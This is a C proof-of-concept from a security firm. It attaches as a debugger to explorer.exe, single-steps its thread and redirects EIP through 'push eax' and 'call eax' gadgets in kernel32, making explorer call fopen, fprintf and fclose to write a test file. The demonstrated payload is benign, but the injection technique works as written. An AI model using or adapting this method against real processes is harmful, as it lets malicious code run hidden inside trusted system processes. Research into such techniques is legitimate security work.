// Copyright 2013 Conix Security, Adrien Chevalier
// adrien.chevalier@conix.fr
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>


//////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Description :
//		Get SE_DEBUG_NAME.
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool elevate_debug()
{
	TOKEN_PRIVILEGES priv;
	HANDLE n1;
	LUID luid;

	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &n1))
	{
		printf(" [!] OpenProcessToken failed.\n");
		return false;
	}

	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	priv.PrivilegeCount=1;
	priv.Privileges[0].Luid=luid;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if(!AdjustTokenPrivileges(n1, FALSE, &priv, sizeof(priv), NULL, NULL))
	{
		printf(" [!] AdjustTokenPrivileges failed.\n");
		return false;
	}

	CloseHandle(n1);
	return true;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Description :
//		Get explorer.exe PID.
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
DWORD getExplorer()
{
	PROCESSENTRY32 current;
	HANDLE list;
	current.dwSize = sizeof(PROCESSENTRY32);
	
	list = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(!list)
	{
		printf("[!] CreateToolhelp32Snapshot failed.\n");
		return 0;
	}
	if(Process32First(list, &current))
	{
		while(Process32Next(list, &current))
			if(!_stricmp(current.szExeFile,"explorer.exe"))
				return current.th32ProcessID;
	}
	else
	{
		printf("[!] Process32First failed.\n");
	}

	printf("[!] Could not find explorer.exe.\n");
	CloseHandle(list);
	return 0;
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Description :
//		Injection.
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
int main(int argc, char** argv)
{
	DWORD fprintfaddr, fcloseaddr, fopenaddr;
	PBYTE ptrkrnl, ptr;
	DWORD ptrPushEax, ptrCallEax;
	DWORD addrFileName, addrOpenMode, hFile;
	DWORD pid = 0;
	DWORD tid = 0;
	DEBUG_EVENT debugEvt;
	CONTEXT originalContext, currentContext;
	HANDLE hProcess, hThread;
	char* buffer=(char*)malloc(100);
	int cpt = 0;

	originalContext.ContextFlags=CONTEXT_INTEGER|CONTEXT_CONTROL;
	currentContext.ContextFlags=CONTEXT_INTEGER|CONTEXT_CONTROL;

	// addresses
	fopenaddr = (DWORD)GetProcAddress(LoadLibraryA("msvcrt.dll"),"fopen");
	fprintfaddr = (DWORD)GetProcAddress(LoadLibraryA("msvcrt.dll"),"fprintf");
	fcloseaddr = (DWORD)GetProcAddress(LoadLibraryA("msvcrt.dll"),"fclose");

	printf("[*] fopen: 0x%.8x\n[*] fprintf: 0x%.8x\n[*] fclose: 0x%.8x\n",fopenaddr,fprintfaddr,fcloseaddr);
	if(fopenaddr == 0 || fprintfaddr == 0 || fcloseaddr == 0)
	{
		printf("[!] failed: addr not found\n");
		return -1;
	}
	// push eax
	ptrkrnl = (PBYTE)GetModuleHandleA("kernel32.dll");
	ptrkrnl += 0x1000;
	ptr = ptrkrnl;
	while(*ptr != 0x50)
		ptr++;
	ptrPushEax = (DWORD)ptr;
	
	// call eax
	ptr = ptrkrnl;
	while(*(PWORD)ptr != 0xD0FF)
		ptr++;
	ptrCallEax = (DWORD)ptr;

	printf("[*] Push Eax : 0x%x\n[*] Call Eax : 0x%x\n",ptrPushEax,ptrCallEax);

	elevate_debug();
	pid=getExplorer();
	if(pid==0)
		return -1;

	if(!DebugActiveProcess(pid))
	{
		printf("[!] DebugActiveProcess failed.\n");
		return -1;
	}

	WaitForDebugEvent(&debugEvt,INFINITE);
	tid = debugEvt.dwThreadId;
	hProcess = debugEvt.u.CreateProcessInfo.hProcess;
	hThread = debugEvt.u.CreateProcessInfo.hThread;

	GetThreadContext(hThread,&originalContext);
	
	//single step
	GetThreadContext(hThread,&currentContext);
	currentContext.EFlags |= 0x100;
	SetThreadContext(hThread,&currentContext);
	printf("[+] Attached to thread %.8x\n",tid);


	while(cpt<16)
	{
		if(debugEvt.dwDebugEventCode == EXCEPTION_DEBUG_EVENT)
		{
			if(	debugEvt.u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_SINGLE_STEP && debugEvt.dwThreadId==tid)
			{
				currentContext.ContextFlags=CONTEXT_INTEGER|CONTEXT_CONTROL;
				if(!GetThreadContext(hThread,&currentContext))
					printf("[!] GetThreadContext Error.\n");
				currentContext.EFlags |= 0x100;
				switch(cpt)
				{
				case 0:
					currentContext.Eax = 0;
					currentContext.Eip = ptrPushEax;
					break;
				case 1:
					currentContext.Eax = 0x7478742e;	//".txt"
					currentContext.Eip = ptrPushEax;
					break;
				case 2:
					currentContext.Eax = 0x6a6e6967;	//"ginj"
					currentContext.Eip = ptrPushEax;
					break;
				case 3:
					currentContext.Eax = 0x75626564;	//"debu"
					currentContext.Eip = ptrPushEax;
					break;
				case 4:
					currentContext.Eax = 0x5f747365;	//"est_"
					currentContext.Eip = ptrPushEax;
					break;
				case 5:
					currentContext.Eax = 0x745C3A43;	//"C:\t"
					currentContext.Eip = ptrPushEax;
					break;
				case 6:
					addrFileName = currentContext.Esp;
					#ifdef DEBUG
					if(ReadProcessMemory(hProcess,(PVOID)addrFileName,buffer,50,&dwbr))
						printf("Filename written: %s (0x%x)\n",buffer, addrFileName);
					#endif
					currentContext.Eax = 0x77;	//"w"
					currentContext.Eip = ptrPushEax;
					break;
				case 7:
					addrOpenMode = currentContext.Esp;
					#ifdef DEBUG
					if(ReadProcessMemory(hProcess,(PVOID)addrOpenMode,buffer,50,&dwbr))
						printf("OpenMode written: %s (0x%x)\n",buffer, addrOpenMode);
					#endif
					currentContext.Eax = addrOpenMode;	//push "w"
					currentContext.Eip = ptrPushEax;
					break;
				case 8:
					currentContext.Eax = addrFileName;	//push &"C:\\test_debuginj.txt"
					currentContext.Eip = ptrPushEax;
					break;
				case 9:
					currentContext.Eax = fopenaddr;	//fopen("C:\test_debuginj.txt","w")
					currentContext.Eip = ptrCallEax;
					break;
				case 10:
					// wait for the call to return : dec cpt to stay in the same "case" statement
					if(currentContext.Eip != ptrCallEax+2)
						cpt--;
					else
					{
						hFile = currentContext.Eax;
						printf("[+] fopen() called, hFile: 0x%x\n",hFile);
						currentContext.Eax = addrFileName;	//&"C:\test_debuginj.txt"
						currentContext.Eip = ptrPushEax;
					}
					
					break;
				case 11:
					currentContext.Eax = hFile;	//handle fopen
					currentContext.Eip = ptrPushEax;
					break;
				case 12:
					currentContext.Eax = fprintfaddr;	//fprintf(hFile,"C:\test_debuginj.txt")
					currentContext.Eip = ptrCallEax;
					break;
				case 13:
					// wait for the call to return
					if(currentContext.Eip != ptrCallEax+2)
						cpt--;
					else
					{
						printf("[+] fprintf() called, return value: 0x%x\n",currentContext.Eax);
						currentContext.Eax = hFile;	//handle fopen
						currentContext.Eip = ptrPushEax;
					}
					break;
				case 14:
					currentContext.Eax = fcloseaddr;	//fclose(hFile)
					currentContext.Eip = ptrCallEax;
					break;
				case 15:
					if(currentContext.Eip != ptrCallEax+2)
						cpt--;
					else
						printf("[+] fclose() called, return value: 0x%x\n",currentContext.Eax);
					break;
				}
				cpt++;
				currentContext.ContextFlags=CONTEXT_INTEGER|CONTEXT_CONTROL;
				if(!SetThreadContext(hThread,&currentContext))
					printf("[!] SetThreadContext Error.\n");
				ContinueDebugEvent(debugEvt.dwProcessId,debugEvt.dwThreadId,DBG_CONTINUE);
			}
			else
			{
				#ifdef DEBUG
				printf("Exception : 0x%x, tid = 0x%x\n",debugEvt.u.Exception.ExceptionRecord.ExceptionCode,debugEvt.dwThreadId);
				#endif
				GetThreadContext(hThread,&currentContext);
				ContinueDebugEvent(debugEvt.dwProcessId,debugEvt.dwThreadId,DBG_EXCEPTION_NOT_HANDLED);
			}
		}
		else
		{
			#ifdef DEBUG
			printf("Event : 0x%x, tid = 0x%x\n",debugEvt.dwDebugEventCode,debugEvt.dwThreadId);
			#endif			
			GetThreadContext(hThread,&currentContext);
			ContinueDebugEvent(debugEvt.dwProcessId,debugEvt.dwThreadId,DBG_CONTINUE);
		}
		WaitForDebugEvent(&debugEvt, INFINITE);
	}
	printf("[+] Resuming process.\n");
	originalContext.ContextFlags=CONTEXT_INTEGER|CONTEXT_CONTROL;
	SetThreadContext(hThread,&originalContext);
	ContinueDebugEvent(debugEvt.dwProcessId,debugEvt.dwThreadId,DBG_CONTINUE);

	DebugActiveProcessStop(pid);
	
	return 0;
}
